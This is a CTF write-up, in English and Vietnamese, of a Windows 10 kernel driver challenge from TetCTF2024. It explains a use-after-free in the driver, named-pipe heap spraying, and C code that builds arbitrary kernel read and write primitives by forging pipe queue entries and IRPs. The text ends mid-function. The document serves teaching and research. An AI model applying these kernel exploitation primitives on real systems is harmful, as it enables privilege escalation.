https://dungnm.hashnode.dev/pwn-coolpool-tetctf2024
================================

CoolPool (0 Solved) - TetCTF2024
================================

23 min read

### [](https://dungnm.hashnode.dev/pwn-coolpool-tetctf2024#heading-loi-noi-dau "Permalink")Preface

I'm on the KCSC team . This is a Windows Kernel exploit that I've done up to the arbitrary read and write step but still couldn't finish it early enough to submit to the team, so it's quite a pity.

So before going into the article, I would like to briefly introduce this article. The author has given us a driver that contains a bug and we have to exploit it to be able to escalate and read the flag created by the admin. And the technique I will use here is NonPaged Pool Exploitation. You can search for this keyword on github, there will be many articles about this part. I will also leave the link I have referenced and used to exploit in the resource section at the end of the article.

### [](https://dungnm.hashnode.dev/pwn-coolpool-tetctf2024#heading-mo-ta "Permalink")Describe

Specifically here the things the author will provide we need to climb the rights and read the flag. In addition here is the version of windows that the author uses here is Windows 10 Pro 22h2

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1706729661886/83571af9-6479-4dfd-bdcb-021531c411d6.png?auto=compress,format&format=webp)

First I ran the author's qemu and saw what version of windows I was using, then I wandered around the internet to find this iso version.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1706714235251/d7812fad-8ea8-4d07-9b2d-e8136318fe5a.png?auto=compress,format&format=webp)

### [](https://dungnm.hashnode.dev/pwn-coolpool-tetctf2024#heading-coolpool-driver "Permalink")CoolPool Driver

When analyzing, I see that this Driver is written on a framework called [Windows Driver Frameworks](https://www.bing.com/ck/a?!&&p=dfe71ecf68793b3aJmltdHM9MTcwNjY1OTIwMCZpZ3VpZD0wOWQ4NjU3Yi00NzRiLTY2OGEtMmUzMy03NjgxNDY0MzY3ZTYmaW5zaWQ9NTE5NQ&ptn=3&ver=2&hsh=3&fclid=09d8657b-474b-668a-2e33-7681464367e6&psq=Wdf+window+&u=a1aHR0cHM6Ly9sZWFybi5taWNyb3NvZnQuY29tL2VuLXVzL3dpbmRvd3MtaGFyZHdhcmUvZHJpdmVycy93ZGYv&ntb=1) , I will not analyze this part in too much detail. When going inside the Driver, I see that there are many indirect calls:

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1706714918285/848d413c-2fff-42e2-912f-758176a91b40.png?auto=compress,format&format=webp)

So I decided to load Driver and debug to get the symbol back (The picture above is me debugging and getting the function name as well as the symbol) and this framework also has an entry named `EvtIoDeviceControl`but I currently can't find where it is.

To load the driver, I use OSR Loader. After loading the driver, I use the following command on windbg to get the driver entry:

Copy

Copy

```
0: kd> !wdfkd.wdfdriverinfo CoolPool
----------------------------------
Default driver image name: CoolPool
WDF library image name: Wdf01000
 FxDriverGlobals  0xffff9d8829645de0
 WdfBindInfo      0xfffff801112c3040
   Version        v1.15
 Library module   0xffff9d8825294180
   ServiceName    \Registry\Machine\System\CurrentControlSet\Services\Wdf01000
   ImageName      Wdf01000
----------------------------------
WDFDRIVER: 0x00006277d51fdd58
Driver logs: Not available
Framework logs: !wdflogdump CoolPool.sys -f

    !wdfdevice 0x00006277d65a5b88 ff (Control device)
        context:  dt 0xffff9d8829a5a760 CONTROL_DEVICE_EXTENSION (size is 0x8 bytes)
        <no associated attribute callbacks>
        !wdfdevicequeues 0x00006277d65a5b88  // ======> Here!!

----------------------------------

WDF Verifier settings for CoolPool.sys is OFF
----------------------------------

```

Copy

Copy

```
0: kd> !wdfdevicequeues 0x00006277d65a5b88
Treating handle as a KMDF handle!

Dumping queues of WDFDEVICE 0x00006277d65a5b88
=====================================
Number of queues: 2
----------------------------------
Queue: 1 !wdfqueue  0x00006277d653dd68
    Manual, Not power-managed, PowerOn, Passive Only, Can accept, Can dispatch, ExecutionLevelPassive, SynchronizationScopeNone
    Number of driver owned requests: 0
    Number of waiting requests: 0

This is WDF internal queue for create requests.
----------------------------------
Queue: 2 !wdfqueue  0x00006277d6677fd8
    Sequential, Default, Not power-managed, PowerOn, Can accept, Can dispatch, ExecutionLevelDispatch, SynchronizationScopeNone
    Number of driver owned requests: 0
    Number of waiting requests: 0

    EvtIoDeviceControl: (0xfffff801112c5490) CoolPool ==> Entry

```

You can use the rebase function of IDA and jump to the correct address, then we have reached the correct entry. As for processing indirect calls, after you rebase, we can get the address of the indirect call to get the function name.

For example, here after I rebase, I will get the address of functionTable and I will add according to the offset of the program, here I will try to get at position 0xC9

Copy

Copy

```
0: kd> dq FFFFF801112C3328 L1
fffff801112c3328  fffff80109ca7058 // ==> function table
0: kd> dq fffff80109ca7058+0xc9*8 L1
fffff80109ca76a0  fffff801`09c4c710 // functionTable[0xC9]
0: kd> u fffff80109c4c710
Wdf01000!imp_WdfDriverMiniportUnload [minkernel\wdf\framework\shared\core\km\fxdriverapikm.cpp @ 158]:
fffff80109c4c710 4883ec28        sub     rsp,28h
fffff80109c4c714 488364243000    and     qword ptr [rsp+30h],0
....

```

Like this we can fix all symbols!!

### [](https://dungnm.hashnode.dev/pwn-coolpool-tetctf2024#heading-the-vulnerability "Permalink")THE VULNERABILITY

In this post after analysis this will be a user-after-free bug

Copy

Copy

```
__int64 __fastcall EvtIoDeviceControl(__int64 a1, __int64 a2, __int64 a3, __int64 a4, int a5)
{
  __int64 v6; // r8
  unsigned int node; // eax

  switch ( a5 )
  {
    case 0x222000:
      node = create_node(a1, a2);
      goto LABEL_8;
    case 0x222004:
      node = edit_node(a1, a2);
      goto LABEL_8;
    case 0x22200C:
      node = del_node();
....
}

```

Here we will have 3 main functions

Copy

Copy

```
__int64 __fastcall create_node(__int64 a1, __int64 a2)
{
  int v2; // ebx
  int v4; // edx
  CoolObject *PoolWithQuotaTag; // rax
  CoolObject *v6; // rdi
  char *buffer_pointer; // [rsp+30h] [rbp-18h] BYREF
  __int64 length; // [rsp+38h] [rbp-10h] BYREF
.............
  buffer_pointer = 0i64;
  ExAcquireResourceSharedLite(&P->data, 1u); //LOCK
  if ( (length - 8) <= 176 && (v4 = *((DWORD*)buffer_pointer + 1), length == v4 + 8) && v4 <= 176 )
  {
    P->header = *(DWORD*)buffer_pointer;
    P->length = *((DWORD*)buffer_pointer + 1);
    PoolWithQuotaTag = ExAllocatePoolWithQuotaTag(NonPagedPoolNx, 176ui64, 'Cool');
    v6 = PoolWithQuotaTag;
    if ( PoolWithQuotaTag )
    {
      memset(PoolWithQuotaTag, 0, 176ui64);
      memcpy(v6, buffer_pointer + 8, *((DWORD*)buffer_pointer + 1));
      P->buffer = v6;
    }
    else
    {
      v2 = -1073741670;
    }
  }
  else
  {
    v2 = -1073741811;
  }
  ExReleaseResourceLite(&P->data); //UNLOCK
  return v2;
}

```

Here, the variable P will be a Global variable . When creating a new node, the variable P will point to this node. Next is`edit_node`

Copy

Copy

```
__int64 __fastcall edit_node(__int64 a1, __int64 a2)
{
  int v2; // ebx
  void *next; // rcx
  PVOID PoolWithQuotaTag; // rax
  void *pool; // rdi
  size_t length; // [rsp+30h] [rbp-18h] BYREF
  void *Buffer; // [rsp+38h] [rbp-10h] BYREF

  Buffer = 0i64;
  ........
  ExAcquireResourceSharedLite(&P->data, 1u);
  if ( P->header && length )
  {
    next = P->buffer;
    if ( length <= P->length )
    {
      if ( next )
      {
        memset(next, 0, 0xB0ui64);
        memcpy(P->buffer, Buffer, length);
      }
      else
      {
        PoolWithQuotaTag = ExAllocatePoolWithQuotaTag(NonPagedPoolNx, 176ui64, 'Cool');
        pool = PoolWithQuotaTag;
        if ( !PoolWithQuotaTag )
        {
          v2 = 0xC000009A;
          goto LABEL_11;
        }
        memset(PoolWithQuotaTag, 0, 0xB0ui64);
        memcpy(pool, Buffer, length);
        P->buffer = pool;
      }
      P->length = length;
      goto LABEL_11;
    }
    if ( next )
    {
    // We will go here
      ExFreePoolWithTag(next, 'Cool');
      P->length = 176;
      P->header = 0;
     // P->next is free but not make NULL
    }
  }
  v2 = -1073741811;
LABEL_11:
  ExReleaseResourceLite(&P->data);
  return v2;
}

```

It can be seen that after freeing the node, P->buffer has not been assigned NULL . This will lead to the function `delete_node`we can free it again.

Copy

Copy

```
__int64 del_node()
{
  void *buffer; // rcx

  if ( !P )
    return 0xC000000Di64;
  ExAcquireResourceSharedLite(&P->data, 1u);
  buffer = P->buffer;
  if ( buffer )
  {
    ExFreePoolWithTag(buffer, 'Cool'); // DOUBLE FREE
    P->buffer = 0i64;
  }
  P->length = 176;
  P->header = 0;
  ExReleaseResourceLite(&P->data);
  return 0i64;
}

```

### [](https://dungnm.hashnode.dev/pwn-coolpool-tetctf2024#heading-exploitation-strategy "Permalink")EXPLOITATION STRATEGY

So this is a Use-After-Free error , we will follow the Flow

1.  Create Node (I will call this chunk 1)

    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1706772432278/57041e1b-72c8-4f3b-88b3-7db5c33c5d09.png?auto=compress,format&format=webp)

2.  Trigger Edit Node to Free ( Lúc này chunk 1 đã bị Free)

    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1706772478882/ea5edd31-7f7a-4711-9086-36e5c8c28ebf.png?auto=compress,format&format=webp)

3.  Alloc New Object to chunk 1 ( Tạo mới một Object gọi là Object "A" cùng độ lớn để ghi vào chunk 1 )

    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1706778558121/bb9524f4-bd20-4791-90ba-7a91779eef85.png?auto=compress,format&format=webp)

4.  Delete Node ( Lúc này Object "A" sẽ bị Free )

    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1706778668110/c288ebe5-b140-49f6-9783-2f3aa16ef68d.png?auto=compress,format&format=webp)

5.  Create Node ( Tạo một Node mới để ghi đè Object "A")

    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1706778716023/01ab8484-6e2f-49e1-b4b7-6527736e002e.png?auto=compress,format&format=webp)

6.  Exploit ( Lúc này thì Object "A" đã được chúng ta control)

Vậy thì câu chuyện đây sẽ là dùng Object nào để tấn công mà vừa có thể ghi vừa có thể đọc được tùy ý

Và thêm nữa là chúng ta sẽ phải heap spray để Object chúng ta mong muốn có thể rơi trúng vào chỗ trống chúng ta đã free. Nếu chưa biết bạn có thể tìm hiểu thêm về kĩ thuật spray heap, nó đều có ở kernel của linux và windows. Cơ bản nó sẽ giống như việc các bạn đục các lỗ hổng

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1706723607587/79332ca7-f144-4a50-a54a-9525bba7c0a9.png?auto=compress,format&format=webp)

Và sau đó tạo thật nhiều Object bạn mong muốn để nó rơi trúng vào các chỗ đã free trên

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1706725375555/f3beafe2-b148-47ef-bfc3-620e85fe5cd2.png?auto=compress,format&format=webp)

Object để tấn công lúc này chúng ta cần phải có độ lớn là 176, và mình sẽ sử dụng Object NamedPipe và cố gắng triển khai được chức năng đọc và ghi tùy ý trong kernel

### [](https://dungnm.hashnode.dev/pwn-coolpool-tetctf2024#heading-cach-namedpipe-hoat-dong "Permalink")Cách NamedPipe hoạt động

Trước khi đi sâu thì mình sẽ giới thiệu qua một chút về NamedPipe. Nếu như các bạn chưa biết thì khi muốn tạo một luồng giao tiếp riêng thì Object này sẽ giúp chúng ta tạo ra một pipe và sẽ có hai đầu thông tin để có thể giúp cho hai tiến trình có thể giao tiếp với nhau qua pipe này :

Copy

Copy

```
NamedType create_np() {
    NamedType cur_np;
    cur_np.Write = CreateNamedPipe(
        L"\\\\.\\pipe\\Pipe",
        PIPE_ACCESS_DUPLEX | FILE_FLAG_OVERLAPPED,
        PIPE_TYPE_BYTE | PIPE_WAIT,
        PIPE_UNLIMITED_INSTANCES,
        (1024 * 16),
        (1024 * 16),
        NMPWAIT_USE_DEFAULT_WAIT,
        0);
    cur_np.Read = CreateFile(L"\\\\.\\pipe\\Pipe", GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, 0);
    return cur_np;
}

```

Như code bên trên mình sẽ dùng để tạo một pipe mới, đến đây thì ở phía kernel land sẽ tạo ra một Control Context Block và bên trong Context này sẽ có một trường tên là Queue và trong Queue này sẽ chứa các request mà các bạn thao tác với pipe vì tất nhiên là khi yêu cầu đọc và ghi gì đó vào pipe thì nó không thể nào xử lí ngay được.

Vậy thì khi chúng ta tạo một request ghi vào pipe một buffer data bất kì thì khi chưa có process nào read thì nó vẫn sẽ mãi ở đó và nó chỉ bị free khi có process read hết data hoặc close pipe handle này, điều này giúp chúng ta spray thật dễ dàng

Copy

Copy

```
void heap_spray() {
    printf("[+]Spraying NPFS\n");
    DWORD resultLength;
    char str[4096];

    for (int i = 0; i < MAX_POOL; i++) {
        memset(str, 1 + i & 0xff, 4096);
        NamedPipeSpray[i] = create_np();
        WriteFile(NamedPipeSpray[i].Write, str, 192 - 0x40, &resultLength, NULL);
    }

    for (int i = 0; i < MAX_POOL; i += 2) {
        resultLength = 0;
        ReadFile(NamedPipeSpray[i].Read, str, 192 - 0x40, &resultLength, NULL);// Read Pipe to free
        CloseHandle(NamedPipeSpray[i].Write);
        NamedPipeSpray[i].Write = NULL;
        NamedPipeSpray[i].Read = NULL;
    }

}

```

Ở trên là một ví dụ minh họa cho việc mình dùng Object NamedPipe để spray, quay lại chủ đề chính là sau khi chúng ta ghi vào pipe như vậy thì trông nó sẽ thế nào ở trong kernel

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1706724688010/751b520c-7a90-46ca-80ad-15238753723a.png?auto=compress,format&format=webp)

Phần struct của CCB,Queue, và QueueEntry được mình tham khảo từ [reactOS](https://doxygen.reactos.org/) và cũng do mình tự dịch ngược và định nghĩa lại một chút.

Copy

Copy

```
struct _NP_DATA_QUEUE
{
  LIST_ENTRY Queue;
  NP_DATA_QUEUE_STATE QueueState;
  ULONG BytesInQueue;
  ULONG EntriesInQueue;
  ULONG quota;
  ULONG QuotaUsed;
  ULONG ByteOffset;
};
struct _NP_DATA_QUEUE_ENTRY
{
    LIST_ENTRY list_entry;
    PIRP IRP;
    PSECURITY_CLIENT_CONTEXT ClientSecurityContext;
    NP_DATA_QUEUE_ENTRY_TYPE DataEntryType;
    int QuotaInEntry;
    int DataSize;
    int Quota;
    char Data[];
};
struct ccb_struc
{
  __int16 Sig;
  int NodeType;
  char NamedPipeState;
  UCHAR CompletionMode[2];
  char field_B;
  SECURITY_QUALITY_OF_SERVICE ClientQos;
  LIST_ENTRY CcbEntry;
  FCB_struc *fcb;
  _BYTE gap30[8];
  PFILE_OBJECT FileObject[2];
  _NP_DATA_QUEUE DataQueue_1;
  _QWORD *field_70;
  _QWORD field_78;
  _BYTE gap80[40];
  _NP_DATA_QUEUE DataQueue_2;
  _BYTE gapD0[80];
  __int64 field_120;
  _QWORD *field_128;
  _BYTE gap130[159];
  char field_1CF;
};

```

Lý do mình chọn Object này là vì phần Header của Queue Entry cũng khá nhỏ, phần Data của Queue Entry thì cũng do mình kiểm soát cả về mặt độ lớn nên mình có thể spraying và dễ dàng cho được Object NamedPipe này vào trong vùng trống đã free

Giả sử trường hợp đẹp nhất là chúng ta đã có thể kiểm soát được một Entry của Queue thì chúng ta sẽ tiến hành sửa Flink và Blink của Entry sao cho chúng trỏ về vùng nhớ userland của chúng ta để có thể tùy biến thay đổi

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1706769490411/47c2007e-d0a4-40d0-90d0-facd40e0c107.png?auto=compress,format&format=webp)

### [](https://dungnm.hashnode.dev/pwn-coolpool-tetctf2024#heading-arbitrary-read "Permalink")Arbitrary Read

Implement chức năng này thì chúng ta cần hiểu các thức Object này hoạt động khi chúng ta sử dụng hàm ReadFile đối với Pipe để đọc dữ liệu trong pipe ra, mình sẽ phân tích hàm `NpReadDataQueue`

Copy

Copy

```
// NpReadDataQueue - npfs.sys - OSR ReactOS
// CUT
while ((&DataEntry->QueueEntry != &DataQueue->Queue) && (RemainingSize))
{
  if (!Peek ||
      DataEntry->DataEntryType == Buffered ||
      DataEntry->DataEntryType == Unbuffered)
  {
      if (DataEntry->DataEntryType == Unbuffered)
      {
          DataBuffer = DataEntry->Irp->AssociatedIrp.SystemBuffer;
      }
      else
      {
          DataBuffer = &DataEntry[1];
      }

      DataSize = DataEntry->DataSize;
      Offset = DataSize;

      if (&DataEntry->QueueEntry == DataQueue->Queue.Flink)
      {
          Offset -= DataQueue->ByteOffset;
      }

      DataLength = Offset;
      if (DataLength >= RemainingSize) DataLength = RemainingSize;

      _SEH2_TRY
      {
          RtlCopyMemory((PVOID)((ULONG_PTR)BufferShared + BufferSize - RemainingSize),
                        (PVOID)((ULONG_PTR)DataBuffer + DataSize - Offset),
                        DataLength);
      }
      _SEH2_EXCEPT(EXCEPTION_EXECUTE_HANDLER)
      {
          ASSERT(FALSE);
      }
      _SEH2_END;
// CUT

```

Vậy là ở hàm `NpReadDataQueue` này sẽ loop cho đến cuối của LIST_ENTRY hoặc là loop cho tới khi đọc đủ được theo yêu cầu của người dùng. Và nếu EntryType là kiểu `Unbuffered` thì nó sẽ đọc data theo địa chỉ của IRP và ngược lại với `Buffered` thì nó sẽ đọc data đang có trong Entry đó

Nhưng có một vấn đề là nếu chúng ta sử dụng hàm `ReadFile` để đọc data thì sau khi đọc hết nó sẽ bị free, điều này sẽ dẫn tới việc khiến cho kernel free vùng userland và tất nhiên sẽ làm chúng ta crash và exploit fail

Vậy thì giải pháp ở đây sẽ là sử dụng hàm `PeekNamedPipe` theo như document của microsoft

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1706730639609/c8717d75-5fe6-4c25-b6f4-e37d8c2f9355.png?auto=compress,format&format=webp)

Vậy thì chúng ta cần phải thiết kế được một Entry ở phía userland như mình đã vẽ bên trên để có thể đọc được tùy ý, tức là `Entry 1 nằm ở kernel sẽ trỏ tới Entry 2 nằm ở Userland`

Copy

Copy

```
//Entry 2
    IRP* my_irp = (IRP*)malloc(sizeof(IRP));
    my_irp->AssociatedIrp = address; // address want to read

    entry = (DATA_QUEUE_ENTRY*)list_entry_user;
    entry->Irp = uint64_t(my_irp);
    entry->EntryType = Unbuffered;
    entry->DataSize = leakSize; // Size of address want to read

```

Như vậy mỗi khi muốn đọc thì chúng ta chỉ cần thay đổi vùng nhớ phía userland là đã thành công rồi

Copy

Copy

```
IRP* craft_irp_leak(BYTE* s, PVOID64 address, ULONG leakSize, ULONG64 list_entry_user) {
    DATA_QUEUE_ENTRY* entry = (DATA_QUEUE_ENTRY*)malloc(sizeof(DATA_QUEUE_ENTRY));
    ZeroMemory(entry, sizeof(DATA_QUEUE_ENTRY));
    //entry 1
    entry->DataSize = offset_leak;
    entry->Blink = entry->Flink = list_entry_user; // list_entry_user is userland
    BYTE* target = s;
    entry->Irp = NULL;
    entry->EntryType = Buffered;
    memcpy(target, entry, sizeof(DATA_QUEUE_ENTRY));
    free(entry);
    //entry 2
    entry = (DATA_QUEUE_ENTRY*)list_entry_user;
    IRP* my_irp = (IRP*)malloc(sizeof(IRP));
    ZeroMemory(entry, sizeof(DATA_QUEUE_ENTRY));
    ZeroMemory(my_irp, sizeof(IRP));
    my_irp->AssociatedIrp = address;  // address want to read
    entry->Irp = uint64_t(my_irp);
    entry->EntryType = Unbuffered;
    entry->DataSize = leakSize; // Size of address want to read
    return my_irp;
}

void leakMem(ULONG64 addr,int len, UCHAR* out) {
    UCHAR* target = (UCHAR*)user_space + 0x1000;
    DWORD nbyteread = 0,remain = 0;
    ZeroMemory(target, 0x2000);
    leakIrp->AssociatedIrp = PVOID64(addr);
    PeekNamedPipe(NamedPipeArray[leakPipe].Read, target, offset_leak + len, &nbyteread, &remain, NULL);
    memcpy(out, target + offset_leak, len);
}

```

### [](https://dungnm.hashnode.dev/pwn-coolpool-tetctf2024#heading-doc-cho-nao-bay-gio "Permalink")Đọc chỗ nào bây giờ ?

Chúng ta đã có chức năng đọc tùy ý, vậy thì cái chúng ta cần đọc sẽ ở đâu trong kernel khi window ngày càng chặn các kĩ thuật leak vốn có trước đây nên chúng ta không thể biết được chúng ta cần đọc ở đâu. Vậy thì quay lại phần dựng hai entry một chút. Các bạn có thể hiểu là khi Peek một pipe bất kì nó sẽ đọc dựa trên độ lớn ở phần `entry->DataSize` , nếu chúng ta sửa Datasize ở entry 1 (Entry nằm ở kernel) thì chúng ta sẽ đọc quá vùng nhớ vốn có của entry 1 đúng không ? Nhưng chúng ta lại không biết bên dưới của entry 1 sẽ là gì, nên mình sẽ cố gắng thiết kế một layout heap sao cho ngay bên dưới của entry 1 sẽ lại là một entry khác của pipe khác

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1706732097775/049dc168-9ae4-4da7-844c-6ebd1078a101.png?auto=compress,format&format=webp)

*Chúng ta có thể đọc được data của cả vùng mình bôi đỏ và cam nếu có layout như hình

Lúc này thì chúng ta có thể có được địa chỉ Flink và Blink sau đó thì tìm đến Control Context Block thì sẽ nhiều thứ để leak ở trong kernel hơn

Để cho dễ hình dung thì mình sẽ mô tả một trường hợp khi mình sử dụng hàm `PeekNamedPipe`

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1706771309491/fb80ef2f-c813-4391-bffb-a0100465bdd4.png?auto=compress,format&format=webp)

Lúc này nếu chúng ta Peek 6 byte thì kết quả trả về sẽ là chuỗi `"hacker"` nếu Peek 12 byte thì sẽ là `"hackerAJOMIX"` và nếu chúng ta sửa Size của Entry 1 thành 1000 thì lúc này chúng ta sẽ đọc được chunk ngay bên dưới Entry 1

### [](https://dungnm.hashnode.dev/pwn-coolpool-tetctf2024#heading-arbitrary-write "Permalink")Arbitrary Write

Đây chắc có lẽ là phần nặng đô nhất của kĩ thuật này vì nó dài kinh khủng.

Cứ mỗi cuổi hàm của Request về NamedPipe sẽ có một hàm Complete IRP, hàm này để hoàn thành nốt những IRP đang PENDING của mỗi FileObject được gửi đi trong Driver hoặc để xử lý kết quả trả về cho User

Chúng ta sẽ sử dụng IRP có kiểu là `Buffered`

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1706768782869/7214e425-99ad-4658-9e6b-88e7d67dce6e.png?auto=compress,format&format=webp)

Ví dụ về một hàm có Complete Request

Copy

Copy

```
// npfs.sys
__int64 __fastcall NpFsdFileSystemControl(PDEVICE_OBJECT DeviceObject, PIRP Irp)
{
  __int64 v4; // r8
  unsigned int v5; // ebx

  KeEnterCriticalRegion();
  v5 = NpCommonFileSystemControl(DeviceObject, Irp, v4);
  KeLeaveCriticalRegion();
  if ( v5 != STATUS_PENDING )
  {
    Irp->IoStatus.Status = v5;
    IofCompleteRequest(Irp, 2);
  }
  return v5;
}

```

Tại hàm `IofCompleteRequest` này thì chúng ta sẽ tận dụng đoạn ghi kết quả trả về cho userland

Copy

Copy

```
//IofCompleteRequest - ntoskrnl.exe - ReactOS
//--------------------cut-----------------
/* Handle Buffered case first */
    if (Irp->Flags & IRP_BUFFERED_IO)
    {
        /* Check if we have an input buffer and if we succeeded */
        if ((Irp->Flags & IRP_INPUT_OPERATION) &&
            (Irp->IoStatus.Status != STATUS_VERIFY_REQUIRED) &&
            !(NT_ERROR(Irp->IoStatus.Status)))
        {
            _SEH2_TRY
            {
                /* Copy the buffer back to the user */
                RtlCopyMemory(Irp->UserBuffer,
                              Irp->AssociatedIrp.SystemBuffer,
                              Irp->IoStatus.Information);
            }
            _SEH2_EXCEPT(EXCEPTION_EXECUTE_HANDLER)
            {
                /* Fail the IRP */
                Irp->IoStatus.Status = _SEH2_GetExceptionCode();
            }
            _SEH2_END;
        }

        /* Also check if we should de-allocate it */
        if (Irp->Flags & IRP_DEALLOCATE_BUFFER)
        {
            /* Deallocate it */
            ExFreePool(Irp->AssociatedIrp.SystemBuffer);
        }
    }
//--------------------cut-----------------

```

Mình sẽ tận dụng đoạn `RtlCopyMemory` để copy dữ liệu về cho User thì mình sẽ sửa Entry 2 sao cho nó chứa một IRP để có thể ghi tùy ý và trông sẽ như thế này

Copy

Copy

```
void craft_irp_write(IRP* copied_irp, ULONG64 destination, ULONG64 source, int size, ULONG64 thread_list) {
    copied_irp->Flags = IRP_INPUT_OPERATION | IRP_BUFFERED_IO;
    copied_irp->Cancel = NULL;
    //copied_irp->CancelRoutine = NULL;
    copied_irp->UserBuffer = PVOID64(destination);
    copied_irp->AssociatedIrp = PVOID64(source);
    copied_irp->IoStatus[2] = size;
    copied_irp->ThreadListEntry.Flink = thread_list; //??
    copied_irp->ThreadListEntry.Blink = thread_list; //??
}
void craft_write_entry(ULONG64 forge_irp, ULONG sz) {
    // Entry 2 modified
    DATA_QUEUE_ENTRY* entry = (DATA_QUEUE_ENTRY*)user_space;
    entry->Blink = entry->Flink = leakNewCCB() - 0x18 + 0xa8;// ???
    entry->EntryType = Buffered;
    entry->QuotaInEntry = sz - 1;
    entry->DataSize = sz;
    entry->Irp = ULONG64(forge_irp);
}
/*
forgeIRP = craft_irp_write(some_irp,des,src,size_x)
craft_write_entry(forgeIRP,8)
*/

```

Nhưng để có thể fake một IRP thì sẽ rất khó cho chúng ta vì thứ nhất là vùng Object này phải được nằm ở phía kernel land và thứ hai là có những trường khác trong IRP Object sẽ rất khó để chúng ta làm giả cũng như liên kết lại với nhau. Vì vậy giải pháp ở đây sẽ là

1.  Trigger NamedPipe tạo một Object IRP chuẩn (Gọi đây là `IRP1`)

2.  Leak `IRP1` và Copy data của `IRP1` (Gọi IRP được copy là `ForgeIRP`)

3.  Sửa `ForgeIRP` và đưa lên Kernel Memory

4.  Leak địa chỉ `ForgeIRP` nằm trên Kernel và đưa vào Entry 2

5.  Trigger `IofCompleteRequest` với `ForgeIRP`

Trước tiên chúng ta cứ đi tiếp phần làm sao để tạo ra Entry mà có chứa IRP và làm sao để đưa `ForgeIRP` lên Kernel

### [](https://dungnm.hashnode.dev/pwn-coolpool-tetctf2024#heading-ntfscontrolfile "Permalink")NtFsControlFile

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1706781433260/df9abb6f-7a8d-44ce-933a-400de247fc23.png?auto=compress,format&format=webp)

Để tạo ra Entry có sử dụng IRP hay là entry `Unbuffered` mình sẽ sử dụng hàm này với mode là `FSCTL_PIPE_INTERNAL_WRITE`

Copy

Copy

```
memset(irp_copied, 0x61, 0x2000);
for_fake = create_np();
NtFsControlFile(for_fake.Write, 0, 0, 0, &isb, FSCTL_PIPE_INTERNAL_WRITE, irp_copied, 0x1000, 0, 0);

```

Lúc này sẽ có một IRP Write được đưa lên kernel (*lưu ý là nếu đúng IRP này đã được đưa lên thành công thì IRP Write->AssociatedIrp sẽ chứa toàn byte `0x61` )

Giả sử mình đã tìm được nó trên Kernel

Copy

Copy

```
0: kd> dt _IRP ffffc88527d178a0 AssociatedIrp
nt!_IRP
   +0x018 AssociatedIrp : <anonymous-tag>
0: kd> dx -id 0,0,ffffc8852349c040 -r1 (*((ntkrnlmp!_IRP *)0xffffc88527d178a0)).AssociatedIrp
(*((ntkrnlmp!_IRP *)0xffffc88527d178a0)).AssociatedIrp                 [Type: <anonymous-tag>]
    [+0x000] MasterIrp        : 0xffffc88528cc8000 [Type: _IRP *]
    [+0x000] IrpCount         : 684490752 [Type: long]
    [+0x000] SystemBuffer     : 0xffffc88528cc8000 [Type: void *]
0: kd> dx -id 0,0,ffffc8852349c040 -r1 ((ntkrnlmp!_IRP *)0xffffc88528cc8000)
((ntkrnlmp!_IRP *)0xffffc88528cc8000)                 : 0xffffc88528cc8000 [Type: _IRP *]
    [<Raw View>]     [Type: _IRP]
    IoStack          : Size = 97, Current {...}
    CurrentStackLocation : 0x6161616161616161 [Type: _IO_STACK_LOCATION *]
    CurrentThread    : 0x6161616161616161 [Type: _ETHREAD *]

```

*IRP Write**lúc này đã chứa một IRP nhỏ bên trong, vậy thì mình sẽ copyIRP Writevề và sửa đổi một chút sau đó thì tận dụng sự lồng chéo nhau này mình sẽ lại đưa được*`ForgeIRP`*lên Kernel Memory*

Tiếp theo sẽ là câu hỏi làm thế nào để leak được IRP Write bây giờ, mình sẽ tìm nó ở đâu

### [](https://dungnm.hashnode.dev/pwn-coolpool-tetctf2024#heading-leak-irp "Permalink")Leak IRP

Nhìn lại cấu trúc của một Queue trong NamedPipe

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1706983667680/3d5974a2-cb84-44ca-bac5-a9d0f49b9cc5.png?auto=compress,format&format=webp)

Khi chúng ta tạo ra 2 pipe thì lúc này 2 Control Context Block của chúng sẽ liên kết với nhau , và trong Queue thì các entry cũng liên kết với nhau như vậy, vậy thì dựa vào sự liên kết này chúng ta sẽ loop tất cả Control Context Block và loop tất cả Entry để tìm IRP Write thì chắc chắn sẽ thành công

Và cũng cách tương tự mình sẽ dùng này để loop liên tục tìm được Control Context Block của Pipe mà mình đang sử dụng để đọc và ghi tùy ý

Nhưng có thể bạn vẫn nhớ tới phần "Đọc chỗ nào bây giờ ?" trong bài và mình có bảo các bạn thiết kế một layout như thế này

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1706732097775/049dc168-9ae4-4da7-844c-6ebd1078a101.png)

Khi chúng ta đã đọc được Npfs Object bên dưới thì chúng ta sẽ dựa vào Object này rồi Loop như mình nói bên trên để tìm lại tất cả những Entry trong Kernel.

Copy

Copy

```
ULONG64 leakNewIrp() {
    printf("[+]Entry %llx %llx\n", g_queue_entry.Flink, g_queue_entry.Blink);

    if (g_queue_entry.Flink != g_queue_entry.Blink && g_queue_entry.Flink > 0) {
        printf("[-]Failed to create Hole\n");
        return NULL;
    }

    ULONG64 CcbBase, stop, ret_value = 0;
    LIST_ENTRY64 ccb_entry;
    int max;
    CcbBase = g_queue_entry.Flink - 0xA8; // OFFSET from Queue ListEntry to CCB Base
    leakMem(ULONG64(CcbBase + 0x18), 0x10, (UCHAR*)&ccb_entry); // leak Queue Address

    max = 0;
    stop = ccb_entry.Blink;
    int list_dq[2] = { 0x48, 0xa8 }; // Offset to Queue. Have 2 Queue in CCB, I dont Know why

    while (max++ < 5000) {
        max++;
        DATA_QUEUE_ENTRY data_queue_entry;
        NP_DATA_QUEUE data_queue;
        ULONG64 stop_entry;
